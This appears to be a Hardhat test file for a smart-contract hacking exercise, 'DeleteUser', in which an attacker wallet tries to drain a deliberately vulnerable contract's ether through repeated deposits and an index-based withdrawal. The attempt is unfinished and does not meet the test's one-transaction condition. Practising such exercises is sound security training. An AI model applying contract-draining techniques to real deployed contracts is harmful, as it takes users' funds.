const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "DeleteUser";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();
        await victimContract.deposit({ value: ethers.utils.parseEther("1") });

        return { victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let victimContract, attackerWallet;
        before(async function () {
            ({ victimContract, attackerWallet } = await loadFixture(setup));
        });

        it("conduct your attack here", async function () {
            //TODO: try fuzzing
            const victimContractWithSignature = victimContract.connect(attackerWallet);

            await victimContractWithSignature.deposit();
            await victimContractWithSignature.deposit();
            users1 = await victimContract.users(0);
            users2 = await victimContract.users(1);
            users3 = await victimContract.users(2);
            console.log(users2);
            console.log(users1);
            await victimContractWithSignature.withdraw(2);

            console.log("after withdraw", users2);
            console.log("after withdraw", users1);
        });

        after(async function () {
            expect(await ethers.provider.getBalance(victimContract.address)).to.be.equal(0);
            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
                1,
                "must exploit one transaction"
            );
        });
    });
});
